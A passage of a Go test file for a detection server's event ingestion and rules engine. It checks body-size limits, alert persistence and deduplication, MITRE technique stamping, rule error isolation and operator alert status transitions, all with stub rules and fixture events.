			req, err := http.NewRequestWithContext(ctx, http.MethodPost, srv.URL, strings.NewReader(body))
			require.NoError(t, err)
			req.Header.Set("Content-Type", "application/json")
			if tc.chunked {
				// Forcing chunked encoding requires the client to NOT know the body length up front. http.NewRequest
				// computes ContentLength from the strings.Reader; setting it to -1 makes Go's transport switch to
				// Transfer-Encoding: chunked, which is exactly the path MaxBytesReader catches.
				req.ContentLength = -1
				req.Header.Set("Transfer-Encoding", "chunked")
			}
			resp, err := srv.Client().Do(req)
			require.NoError(t, err)
			defer resp.Body.Close()
			assert.Equal(t, http.StatusRequestEntityTooLarge, resp.StatusCode, "413 per RFC 9110 §15.5.14")
			respBody, _ := io.ReadAll(resp.Body)
			var parsed map[string]string
			require.NoError(t, json.Unmarshal(respBody, &parsed))
			assert.Equal(t, "body_too_large", parsed["error"], "typed diagnostic per the spec")

			hosts, err := d.Service().ListHosts(ctx)
			require.NoError(t, err)
			assert.Empty(t, hosts, "no events persisted when the body is rejected")
		})
	}
}

// spec:server-event-ingestion/body-size-limit/a-right-at-cap-body-is-accepted
//
// Boundary test: construct a body whose serialized length is just under MaxIngestBodyBytes and assert the handler reads
// the entire payload, validates every event, and returns 200. The test pads ONE event's payload field with ASCII bytes
// to drive the total body length close to the cap; the JSON wrapper overhead means the actual payload string is the
// cap minus the envelope shape. Wall-clock cost is ~100ms for the 10 MB allocation + parse + insert; well under
// suite-wide test budgets.
func TestIngest_RightAtCapAccepted(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()
	srv := httptest.NewServer(withHostID(d.Service().IngestHandler(), "host-a"))
	t.Cleanup(srv.Close)

	// Compute the maximum payload-data length that keeps the total body at or below the cap. The envelope structure is
	// fixed; everything beyond the data string is constant overhead we can subtract from the cap.
	envelope := `[{"event_id":"e-cap","host_id":"host-a","timestamp_ns":1,"event_type":"fork","payload":{"data":""}}]`
	overhead := len(envelope)
	dataLen := intake.MaxIngestBodyBytes - overhead - 32 // 32-byte safety margin for JSON escaping / encoding
	body := `[{"event_id":"e-cap","host_id":"host-a","timestamp_ns":1,"event_type":"fork","payload":{"data":"` +
		strings.Repeat("A", dataLen) + `"}}]`
	require.LessOrEqual(t, len(body), intake.MaxIngestBodyBytes, "test fixture must fit under the cap")

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, srv.URL, strings.NewReader(body))
	require.NoError(t, err)
	req.Header.Set("Content-Type", "application/json")
	resp, err := srv.Client().Do(req)
	require.NoError(t, err)
	defer resp.Body.Close()
	assert.Equal(t, http.StatusOK, resp.StatusCode, "right-at-cap body must be accepted")

	count, err := d.Store().CountEvents(ctx)
	require.NoError(t, err)
	assert.Equal(t, int64(1), count, "the single right-at-cap event was persisted")
}

// ---- Engine + processor tests ----------------------------------------------

// spec:server-detection-rules-engine/persisted-alert-schema/a-rule-fires-and-creates-an-alert
//
// The spec scenario requires the persisted alert row to carry HostID, RuleID, Severity, Title, Description, ProcessID,
// and the rule's MITRE technique list. The previous version of this test only asserted RuleID + Severity; expanded
// here to pin every field the spec enumerates. The stubRule (top of file) emits findings with HostID derived from
// the trigger event, ProcessID=1 (matches the first inserted process row), Title="Triggered", Description="stub rule
// fired", and propagates Techniques=[T9999] from its own configured list, so every assertion below points at a
// stub-controlled value that a regression on the engine's alert-write path would visibly perturb.
func TestEngine_EvaluatesAndPersistsAlerts(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	d.LoadActive(stubProvider{rules: []rulesapi.Rule{&stubRule{id: "stub", techniques: []string{"T9999"}}}})

	// Seed a process row so the alert's process_id FK resolves.
	procID := mustInsertProcess(t, ctx, d, "host-a", 100)

	events := []api.Event{
		{EventID: "fork-1", HostID: "host-a", TimestampNs: 1000, EventType: "fork", Payload: json.RawMessage(`{"child_pid":100,"parent_pid":1}`)},
		{EventID: "trigger-1", HostID: "host-a", TimestampNs: 2000, EventType: "trigger", Payload: json.RawMessage(`{}`)},
	}
	insertEventsViaIngest(ctx, t, d, "host-a", events)

	// One processor tick is enough; ProcessOnce is exposed on the processor for deterministic test signalling. Use a brief busy-loop on
	// Run to converge.
	require.Eventually(t, func() bool {
		alerts, _ := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
		return len(alerts) > 0
	}, 5*time.Second, 50*time.Millisecond, "expected stub rule to produce an alert")

	alerts, err := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
	require.NoError(t, err)
	require.Len(t, alerts, 1)
	a := alerts[0]
	assert.Equal(t, "host-a", a.HostID, "alert.host_id = event.host_id")
	assert.Equal(t, "stub", a.RuleID, "alert.rule_id = stub rule's ID")
	assert.Equal(t, rulesapi.SeverityHigh, a.Severity, "alert.severity = stub rule's declared severity")
	assert.Equal(t, "Triggered", a.Title, "alert.title = stub rule's finding title")
	assert.Equal(t, "stub rule fired", a.Description, "alert.description = stub rule's finding description")
	assert.Equal(t, procID, a.ProcessID, "alert.process_id = the seeded process row's DB ID")
	assert.Equal(t, api.JSONStringSlice{"T9999"}, a.Techniques, "alert.techniques = stub rule's declared MITRE list")
}

// spec:server-detection-rules-engine/alert-dedup-by-subject/a-rule-re-fires-on-the-same-process-in-a-later-batch
func TestEngine_DedupSilencesRepeatRuleHits(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	d.LoadActive(stubProvider{rules: []rulesapi.Rule{&stubRule{id: "stub-dedup"}}})

	mustInsertProcess(t, ctx, d, "host-a", 100)

	events := []api.Event{
		{EventID: "fork-1", HostID: "host-a", TimestampNs: 1000, EventType: "fork", Payload: json.RawMessage(`{"child_pid":100,"parent_pid":1}`)},
		{EventID: "trigger-a", HostID: "host-a", TimestampNs: 2000, EventType: "trigger", Payload: json.RawMessage(`{}`)},
		{EventID: "trigger-b", HostID: "host-a", TimestampNs: 3000, EventType: "trigger", Payload: json.RawMessage(`{}`)},
	}
	insertEventsViaIngest(ctx, t, d, "host-a", events)

	require.Eventually(t, func() bool {
		alerts, _ := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
		return len(alerts) >= 1
	}, 5*time.Second, 50*time.Millisecond)

	// The unique key is (host_id, rule_id, process_id); two trigger events from the same rule against the same process must collapse into
	// ONE alert row regardless of how many triggers we sent.
	alerts, err := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
	require.NoError(t, err)
	assert.Len(t, alerts, 1)
}

// spec:server-detection-rules-engine/evaluate-every-registered-rule-against-each-batch/a-batch-produces-multiple-findings-from-one-rule
//
// stubRule fires once per "trigger" event but always sets ProcessID=1, which collapses to one alert by the (host, rule,
// process) dedup key. This test uses multiPIDStub instead (defined locally), which emits a finding per trigger whose
// ProcessID matches the trigger's payload "pid" field. Two trigger events with payload pids 1 and 2 produce two
// findings against two different process IDs, which the engine persists as two distinct alert rows. Pins the spec's
// "A single rule MAY emit zero, one, or many findings per batch" clause for the multi-finding case.
func TestEngine_OneRuleMultipleFindings(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	d.LoadActive(stubProvider{rules: []rulesapi.Rule{&multiPIDStub{id: "stub-multi"}}})

	procA := mustInsertProcess(t, ctx, d, "host-a", 100)
	procB := mustInsertProcess(t, ctx, d, "host-a", 200)

	events := []api.Event{
		{EventID: "fork-1", HostID: "host-a", TimestampNs: 1000, EventType: "fork", Payload: json.RawMessage(`{"child_pid":100,"parent_pid":1}`)},
		{EventID: "fork-2", HostID: "host-a", TimestampNs: 1500, EventType: "fork", Payload: json.RawMessage(`{"child_pid":200,"parent_pid":1}`)},
		// payload.process_id (the DB row id from mustInsertProcess) steers the stub's emitted ProcessID; the two
		// triggers below carry different DB ids so the resulting findings have different dedup keys and persist
		// as two alert rows. Field name is "process_id" (not "pid") to make it obvious this is a DB-row identifier,
		// not an OS PID. See the multiPIDStub docstring for the prior FK-violation bug this rename prevents.
		{EventID: "trigger-1", HostID: "host-a", TimestampNs: 2000, EventType: "trigger",
			Payload: json.RawMessage(`{"process_id":` + strconv.FormatInt(procA, 10) + `}`)},
		{EventID: "trigger-2", HostID: "host-a", TimestampNs: 2100, EventType: "trigger",
			Payload: json.RawMessage(`{"process_id":` + strconv.FormatInt(procB, 10) + `}`)},
	}
	insertEventsViaIngest(ctx, t, d, "host-a", events)

	require.Eventually(t, func() bool {
		alerts, _ := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
		return len(alerts) >= 2
	}, 5*time.Second, 50*time.Millisecond, "expected two alert rows, one per finding")

	alerts, err := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
	require.NoError(t, err)
	assert.Len(t, alerts, 2, "two findings with different process_ids must persist as two alerts")
}

// spec:server-detection-rules-engine/evaluate-every-registered-rule-against-each-batch/a-batch-produces-no-findings-from-any-rule
//
// LoadActive with one rule that fires only on "trigger" events; send a batch with only fork/exec events. The engine
// evaluates the rule, the rule returns zero findings, and no alerts are persisted. Pins the spec's "zero or many" clause
// for the zero case.
func TestEngine_BatchProducesNoFindings(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	d.LoadActive(stubProvider{rules: []rulesapi.Rule{&stubRule{id: "stub-quiet"}}})
	mustInsertProcess(t, ctx, d, "host-a", 100)

	// Only fork events; stubRule only fires on "trigger" event_type so the batch is silent.
	events := []api.Event{
		{EventID: "no-trigger-1", HostID: "host-a", TimestampNs: 1000, EventType: "fork", Payload: json.RawMessage(`{"child_pid":100,"parent_pid":1}`)},
		{EventID: "no-trigger-2", HostID: "host-a", TimestampNs: 2000, EventType: "fork", Payload: json.RawMessage(`{"child_pid":101,"parent_pid":100}`)},
	}
	insertEventsViaIngest(ctx, t, d, "host-a", events)

	// Convergence-based negative assertion: poll until the processor has fully drained the batch (every event is
	// marked processed = 1). Once CountUnprocessed reaches 0 we know the engine has evaluated against this batch and
	// emitted no findings; then we read ListAlerts and assert empty. This pattern replaces a fixed time.Sleep which
	// CI runners can blow past or undershoot.
	require.Eventually(t, func() bool {
		n, err := d.Store().CountUnprocessed(ctx)
		return err == nil && n == 0
	}, 5*time.Second, 25*time.Millisecond, "processor must drain the batch even when no rule fires")

	alerts, err := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
	require.NoError(t, err)
	assert.Empty(t, alerts, "a batch matching no rule must produce zero alerts")
}

// spec:server-detection-rules-engine/operator-toggling-of-individual-rules/an-operator-disables-a-noisy-rule-for-their-environment
//
// LoadActive's replace-semantics is the path the spec calls out: an operator updates configuration; the rules
// provider's ActiveRules() returns a smaller set; the engine swaps its rule list. The disabled rule is gone from
// engine.rules so Evaluate never calls its Evaluate method, no findings are produced, and (the dedup-collapse-on-
// reactivation question is out of scope here) no alerts land for the disabled rule against subsequent batches.
// Two rules are active in phase 1; one is removed in phase 2; the test asserts the surviving rule keeps firing
// against new process IDs while the removed rule produces NO new alerts on those same IDs.
func TestEngine_OperatorDisablesNoisyRule(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	noisy := &multiPIDStub{id: "rule-noisy"}
	quiet := &multiPIDStub{id: "rule-quiet"}
	d.LoadActive(stubProvider{rules: []rulesapi.Rule{noisy, quiet}})

	// Phase 1: both rules active. Seed two process rows so multiPIDStub's findings have valid FK targets, and feed a
	// batch whose triggers carry those processes' DB ids. Each rule sees both triggers, so we expect 4 alerts: the
	// cross-product of {noisy, quiet} x {procA, procB}.
	procA := mustInsertProcess(t, ctx, d, "host-a", 100)
	procB := mustInsertProcess(t, ctx, d, "host-a", 101)
	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{
		{EventID: "trig-a-phase1", HostID: "host-a", TimestampNs: 1000, EventType: "trigger",
			Payload: json.RawMessage(`{"process_id":` + strconv.FormatInt(procA, 10) + `}`)},
		{EventID: "trig-b-phase1", HostID: "host-a", TimestampNs: 1001, EventType: "trigger",
			Payload: json.RawMessage(`{"process_id":` + strconv.FormatInt(procB, 10) + `}`)},
	})

	require.Eventually(t, func() bool {
		alerts, _ := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
		return len(alerts) >= 4
	}, 5*time.Second, 50*time.Millisecond, "both rules should fire on both processes in phase 1")

	// Phase 2: operator disables the noisy rule. LoadActive replaces engine.rules with just `quiet`. Seed two
	// FRESH process rows so neither rule has prior alert dedup keys for those PIDs. This makes ruleA vs ruleB
	// outcomes for the new batch distinguishable.
	d.LoadActive(stubProvider{rules: []rulesapi.Rule{quiet}})
	procC := mustInsertProcess(t, ctx, d, "host-a", 200)
	procD := mustInsertProcess(t, ctx, d, "host-a", 201)
	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{
		{EventID: "trig-c-phase2", HostID: "host-a", TimestampNs: 2000, EventType: "trigger",
			Payload: json.RawMessage(`{"process_id":` + strconv.FormatInt(procC, 10) + `}`)},
		{EventID: "trig-d-phase2", HostID: "host-a", TimestampNs: 2001, EventType: "trigger",
			Payload: json.RawMessage(`{"process_id":` + strconv.FormatInt(procD, 10) + `}`)},
	})

	// Wait for the phase-2 batch to drain through the processor so the assertion isn't racing the engine.
	require.Eventually(t, func() bool {
		n, err := d.Store().CountUnprocessed(ctx)
		return err == nil && n == 0
	}, 5*time.Second, 25*time.Millisecond, "processor must consume the phase-2 batch before the assertion")

	alerts, err := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
	require.NoError(t, err)

	var noisyOnNewPIDs, quietOnNewPIDs int
	newPIDs := map[int64]struct{}{procC: {}, procD: {}}
	for _, a := range alerts {
		if _, fresh := newPIDs[a.ProcessID]; !fresh {
			continue
		}
		switch a.RuleID {
		case "rule-noisy":
			noisyOnNewPIDs++
		case "rule-quiet":
			quietOnNewPIDs++
		}
	}
	assert.Equal(t, 0, noisyOnNewPIDs, "disabled rule MUST produce no alerts on processes seen only in phase 2")
	assert.Equal(t, 2, quietOnNewPIDs, "remaining rule MUST continue evaluating: 2 fresh processes -> 2 fresh alerts")
}

// spec:server-detection-rules-engine/mitre-att-ck-technique-stamping/a-rule-advertises-att-ck-techniques
//
// Two assertions in one test:
//
//  1. The rule's declared technique list lands on the persisted alert row.
//  2. AFTER persisting, mutating the rule's technique mapping does NOT modify the historical alert. The dedup-by-
//     (host,rule,process) means a second fire is silently skipped; the historical alert's techniques column is frozen
//     at first-fire. The test mutates the stub's techniques between fires and re-evaluates; the alert row's
//     Techniques is asserted unchanged.
func TestEngine_MITRETechniqueStampingAndHistoricalPreservation(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	rule := &stubRule{id: "stub-mitre", techniques: api.JSONStringSlice{"T1059.002", "T1105"}}
	d.LoadActive(stubProvider{rules: []rulesapi.Rule{rule}})
	mustInsertProcess(t, ctx, d, "host-a", 100)

	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{
		{EventID: "fork-1", HostID: "host-a", TimestampNs: 1000, EventType: "fork", Payload: json.RawMessage(`{"child_pid":100,"parent_pid":1}`)},
		{EventID: "trigger-1", HostID: "host-a", TimestampNs: 2000, EventType: "trigger", Payload: json.RawMessage(`{}`)},
	})

	require.Eventually(t, func() bool {
		alerts, _ := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
		return len(alerts) > 0
	}, 5*time.Second, 50*time.Millisecond)

	alerts, err := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
	require.NoError(t, err)
	require.Len(t, alerts, 1)
	assert.Equal(t, api.JSONStringSlice{"T1059.002", "T1105"}, alerts[0].Techniques, "rule's declared techniques land on the alert")

	// Refine the rule's technique mapping AFTER the alert is persisted, then drive another trigger. The (host, rule,
	// process) dedup means no new row is created; the historical row's Techniques column is asserted unchanged.
	rule.techniques = []string{"T9999.999"}
	d.LoadActive(stubProvider{rules: []rulesapi.Rule{rule}})
	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{
		{EventID: "trigger-2", HostID: "host-a", TimestampNs: 3000, EventType: "trigger", Payload: json.RawMessage(`{}`)},
	})

	// Wait for the second trigger to actually be processed before asserting on the alert state. Replaces a fixed
	// time.Sleep which CodeRabbit + Copilot both flagged as flake-prone: a slow CI runner can have the assertion
	// run before the processor's next cycle, accidentally green-lighting a regression.
	require.Eventually(t, func() bool {
		n, err := d.Store().CountUnprocessed(ctx)
		return err == nil && n == 0
	}, 5*time.Second, 25*time.Millisecond, "processor must consume trigger-2 before the historical-preservation assertion")

	alerts, err = d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
	require.NoError(t, err)
	require.Len(t, alerts, 1, "dedup must skip the second fire on the same (host, rule, process)")
	assert.Equal(t, api.JSONStringSlice{"T1059.002", "T1105"}, alerts[0].Techniques,
		"historical alert's technique stamp must not change when the rule's mapping is later refined")
}

// spec:server-detection-rules-engine/rule-failure-isolation-batch-retry-on-persistence-failure/one-rule-errors-during-evaluation
//
// LoadActive with two rules: errorStub returns an error on Evaluate; stubRule fires normally. The engine's per-rule
// loop logs the error and continues to the next rule. After the batch settles, exactly one alert exists: the one
// from the working rule.
func TestEngine_OneRuleErrorsRestContinue(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	d.LoadActive(stubProvider{rules: []rulesapi.Rule{
		&errorStub{id: "stub-error"},
		&stubRule{id: "stub-ok", techniques: []string{"T9999"}},
	}})
	mustInsertProcess(t, ctx, d, "host-a", 100)

	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{
		{EventID: "fork-1", HostID: "host-a", TimestampNs: 1000, EventType: "fork", Payload: json.RawMessage(`{"child_pid":100,"parent_pid":1}`)},
		{EventID: "trigger-1", HostID: "host-a", TimestampNs: 2000, EventType: "trigger", Payload: json.RawMessage(`{}`)},
	})

	require.Eventually(t, func() bool {
		alerts, _ := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
		return len(alerts) > 0
	}, 5*time.Second, 50*time.Millisecond, "stub-ok must still fire even though stub-error returned an error")

	alerts, err := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
	require.NoError(t, err)
	require.Len(t, alerts, 1, "only stub-ok produces an alert; stub-error is logged + skipped")
	assert.Equal(t, "stub-ok", alerts[0].RuleID, "the alert is from the rule that didn't error")
}

// spec:server-detection-rules-engine/rule-failure-isolation-batch-retry-on-persistence-failure/an-alert-persistence-write-fails
//
// Force the alert-write path to fail by using a stub that emits Finding.ProcessID = 999999999, a value that doesn't
// match any row in the processes table, so InsertAlert's fk_alerts_process FK constraint blocks the row. The engine's
// persistFinding returns the wrapped error; Evaluate propagates it to the processor; the processor logs
// "detection failure, will retry batch" and leaves the events as unprocessed so a future cycle can retry. The DB stays
// usable throughout so we can actually ASSERT the outcome: the prior shape closed the DB pool and could only check
// "didn't panic," which CodeRabbit + Copilot + Gemini all flagged as unpinned.
//
// Pins the spec's two clauses: (1) the engine signals the failure (no alert is acknowledged), (2) the failed finding is
// not silently discarded (events stay unprocessed, available for the next retry cycle).
func TestEngine_PersistenceFailureSurfacesError(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	// processID 999999999 is guaranteed not to exist in the processes table (the BIGINT auto-increment counter is
	// nowhere near that value in a fresh test DB), so InsertAlert hits the fk_alerts_process FK and returns an error
	// every cycle. The processor's retry loop will keep trying; we only need it to try ONCE for the assertion to hold.
	const bogusProcessID int64 = 999_999_999
	rule := &fixedPIDStub{id: "stub-persist-fail", processID: bogusProcessID}
	d.LoadActive(stubProvider{rules: []rulesapi.Rule{rule}})
	mustInsertProcess(t, ctx, d, "host-a", 100)

	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{
		{EventID: "trigger-1", HostID: "host-a", TimestampNs: 2000, EventType: "trigger", Payload: json.RawMessage(`{}`)},
	})

	// Wait for the engine to actually invoke Evaluate at least once. CountUnprocessed > 0 is trivially satisfied
	// (events start unprocessed before the processor claims them), so it can't tell us "the processor tried and
	// failed." rule.evalCount.Add(1) fires inside Evaluate; once it's >= 1, the engine demonstrably ran the rule,
	// got a Finding, called persistFinding, hit the FK, and returned the error. That's the precondition the spec
	// scenario actually constrains. (Gemini medium-priority finding on PR #239.)
	require.Eventually(t, func() bool {
		return rule.evalCount.Load() >= 1
	}, 5*time.Second, 25*time.Millisecond, "engine must have invoked Evaluate at least once")

	// Now that the engine has tried and failed, the persistence-failure path must NOT have produced an alert,
	// and the processor must have left the events unprocessed for the next retry cycle.
	n, err := d.Store().CountUnprocessed(ctx)
	require.NoError(t, err)
	assert.Positive(t, n, "events stay unprocessed because the engine returned an error on persistFinding")

	alerts, err := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
	require.NoError(t, err)
	assert.Empty(t, alerts, "FK-violating finding must NOT produce an alert row; failure is surfaced, not swallowed")

	// Negative assertion (b): events are still in the events table (not deleted/forgotten by the processor). A
	// regression that drops events on persistence failure would silently lose telemetry; this assertion catches it.
	count, err := d.Store().CountEvents(ctx)
	require.NoError(t, err)
	assert.Positive(t, count, "events must remain in the table so a future retry cycle can re-evaluate them")
}

// spec:server-detection-rules-engine/snapshot-exec-events-are-excluded-from-rule-evaluation/a-snapshot-exec-is-delivered-in-a-batch
//
// Load a stub rule that fires on every "exec" event. Post a batch containing one regular exec + one snapshot=true
// exec. The engine's filterSnapshotEvents call removes the snapshot exec before rule evaluation, so the rule sees
// only the regular exec. The single resulting finding produces one alert; the snapshot exec produces none.
//
// This is the engine-level end-to-end proof. The filter predicate itself is unit-tested in
// server/detection/internal/engine/filter_test.go (TestIsSnapshotExec); this test pins that the engine actually wires
// the filter into Evaluate, which the spec scenario explicitly requires.
func TestEngine_SnapshotExecExcludedFromEvaluation(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	procID := mustInsertProcess(t, ctx, d, "host-a", 100)
	d.LoadActive(stubProvider{rules: []rulesapi.Rule{&execFiringStub{id: "stub-exec", processID: procID}}})

	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{
		// Regular exec: rule sees it, fires.
		{EventID: "exec-live", HostID: "host-a", TimestampNs: 1000, EventType: "exec",
			Payload: json.RawMessage(`{"path":"/usr/bin/live","pid":100}`)},
		// Snapshot exec: filter strips it before the rule sees it; no alert produced.
		{EventID: "exec-snap", HostID: "host-a", TimestampNs: 1500, EventType: "exec",
			Payload: json.RawMessage(`{"path":"/usr/bin/snap","pid":200,"snapshot":true}`)},
	})

	require.Eventually(t, func() bool {
		alerts, _ := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
		return len(alerts) >= 1
	}, 5*time.Second, 50*time.Millisecond, "the live exec must trigger one alert")

	alerts, err := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
	require.NoError(t, err)
	assert.Len(t, alerts, 1, "snapshot=true exec must be filtered before rule evaluation; only the live exec produces an alert")
}

// ---- Operator alert lifecycle tests ----------------------------------------

func TestOperator_UpdateAlertStatus_HappyPath(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{
		mode:       bootstrap.ModeFull,
		userExists: stubUserExists(42),
	})
	ctx := t.Context()

	mustInsertProcess(t, ctx, d, "host-a", 100)
	d.LoadActive(stubProvider{rules: []rulesapi.Rule{&stubRule{id: "lifecycle"}}})
	insertEventsViaIngest(ctx, t, d, "host-a", []api.Event{
		{EventID: "trigger", HostID: "host-a", TimestampNs: 1, EventType: "trigger", Payload: json.RawMessage(`{}`)},
	})

	var alertID int64
	require.Eventually(t, func() bool {
		alerts, _ := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
		if len(alerts) == 0 {
			return false
		}
		alertID = alerts[0].ID
		return true
	}, 5*time.Second, 50*time.Millisecond)

	// Walk the legal lifecycle: open -> acknowledged -> resolved.
	updated, err := d.Service().UpdateAlertStatus(ctx, alertID, api.AlertStatusAcknowledged, 42)
	require.NoError(t, err)
	assert.Equal(t, api.AlertStatusAcknowledged, updated.Status)
	require.NotNil(t, updated.UpdatedBy)
	assert.Equal(t, int64(42), *updated.UpdatedBy)

	updated, err = d.Service().UpdateAlertStatus(ctx, alertID, api.AlertStatusResolved, 42)
	require.NoError(t, err)
	assert.Equal(t, api.AlertStatusResolved, updated.Status)
	require.NotNil(t, updated.ResolvedAt, "resolved_at must be stamped on the resolve transition")
}

func TestOperator_UpdateAlertStatus_RejectsUnknownUser(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{
		mode:       bootstrap.ModeFull,
		userExists: stubUserExists(42), // userID 99 is NOT known
	})
	ctx := t.Context()

	alertID := seedSingleAlert(t, ctx, d)

	// userID 99 is not in the UserExists set. The cross-context FK
	// guard (ErrInvalidUserUpdater) MUST fire before the row update.
	_, err := d.Service().UpdateAlertStatus(ctx, alertID, api.AlertStatusAcknowledged, 99)
	require.ErrorIs(t, err, api.ErrInvalidUserUpdater,
		"expected ErrInvalidUserUpdater, got %v", err)

	// Row must NOT have moved.
	got, _, err := d.Service().GetAlert(ctx, alertID)
	require.NoError(t, err)
	assert.Equal(t, api.AlertStatusOpen, got.Status)
}

func TestOperator_UpdateAlertStatus_TerminalImmutable(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{
		mode:       bootstrap.ModeFull,
		userExists: stubUserExists(42),
	})
	ctx := t.Context()

	alertID := seedSingleAlert(t, ctx, d)

	// open -> acknowledged -> resolved -> open is the legal reopen
	// path; resolved -> acknowledged is forbidden.
	_, err := d.Service().UpdateAlertStatus(ctx, alertID, api.AlertStatusAcknowledged, 42)
	require.NoError(t, err)
	_, err = d.Service().UpdateAlertStatus(ctx, alertID, api.AlertStatusResolved, 42)
	require.NoError(t, err)
	_, err = d.Service().UpdateAlertStatus(ctx, alertID, api.AlertStatusAcknowledged, 42)
	require.Error(t, err)
	assert.ErrorIs(t, err, api.ErrInvalidAlertTransition,
		"expected ErrInvalidAlertTransition, got %v", err)
}

// spec:server-detection-rules-engine/alert-to-event-linkage/an-analyst-opens-an-alert-and-sees-its-triggering-events
// spec:server-rest-api/alert-detail-with-linked-event-ids/an-operator-opens-an-alert
//
// Two scenarios share this test: the rules-engine spec says alerts carry their triggering event IDs (the engine-side
// contract); the REST API spec says GetAlert returns those event IDs to an operator opening the detail page (the read
// surface). The same code path satisfies both: the service-layer GetAlert query reads the alert_events join table.
func TestOperator_GetAlert_ReturnsCorrelatedEventIDs(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	alertID := seedSingleAlert(t, ctx, d)

	alert, eventIDs, err := d.Service().GetAlert(ctx, alertID)
	require.NoError(t, err)
	assert.Equal(t, alertID, alert.ID)
	assert.NotEmpty(t, eventIDs, "alert must surface its triggering event ids")
}

func TestOperator_GetAlert_NotFound(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	_, _, err := d.Service().GetAlert(ctx, 999_999)
	require.Error(t, err)
	assert.ErrorIs(t, err, api.ErrAlertNotFound)
}

// spec:server-rest-api/filterable-alerts-list/an-operator-filters-alerts-by-host
// spec:server-rest-api/filterable-alerts-list/an-operator-combines-status-and-severity-filters
//
// Two scenarios share this test. The host-only filter is the simpler case; the combined-filters case below uses
// AlertFilter{Status, Severity} on a uniform corpus (both seeded alerts share status=open and severity=high) to
// prove the filter is a conjunction, not a disjunction: filtering on (open, high) returns both rows, while
// filtering on (open, critical) returns zero. If a regression made severity a no-op, the (open, critical) check
// would incorrectly return the two open rows and the assertion would fail.
func TestOperator_ListAlerts_FiltersByHostAndStatus(t *testing.T) {
	t.Parallel()
	d := newDetection(t, detectionOpts{mode: bootstrap.ModeFull})
	ctx := t.Context()

	procIDA := mustInsertProcess(t, ctx, d, "host-a", 100)
	procIDB := mustInsertProcess(t, ctx, d, "host-b", 200)
	insertAlertDirect(t, ctx, d, "host-a", "rule-x", procIDA, []string{})
	insertAlertDirect(t, ctx, d, "host-b", "rule-x", procIDB, []string{})

	allHosts, err := d.Service().ListAlerts(ctx, api.AlertFilter{})
	require.NoError(t, err)
	assert.Len(t, allHosts, 2)

	onlyA, err := d.Service().ListAlerts(ctx, api.AlertFilter{HostID: "host-a"})
	require.NoError(t, err)
	require.Len(t, onlyA, 1)
	assert.Equal(t, "host-a", onlyA[0].HostID)

	openOnly, err := d.Service().ListAlerts(ctx, api.AlertFilter{Status: api.AlertStatusOpen})
	require.NoError(t, err)
	assert.Len(t, openOnly, 2, "fresh alerts default to open")

	// Combined status + severity filter. The two seeded alerts both default to (status=open, severity=high) per
	// insertAlertDirect's hardcoded severity, so filtering on (open, high) returns both and filtering on (open,
	// critical) returns zero. The two combined cases together prove the filter is a conjunction, not a disjunction:
	// if a regression made severity a no-op, both subqueries would return 2 and the second assertion would fail.
	openHigh, err := d.Service().ListAlerts(ctx, api.AlertFilter{Status: api.AlertStatusOpen, Severity: api.SeverityHigh})
	require.NoError(t, err)
	assert.Len(t, openHigh, 2, "both seeded alerts match (open, high)")

	openCritical, err := d.Service().ListAlerts(ctx, api.AlertFilter{Status: api.AlertStatusOpen, Severity: api.SeverityCritical})
	require.NoError(t, err)
	assert.Empty(t, openCritical, "no seeded alerts match (open, critical); proves severity is honored, not no-op")
}

// ---- Heartbeat / metrics gauges --------------------------------------------

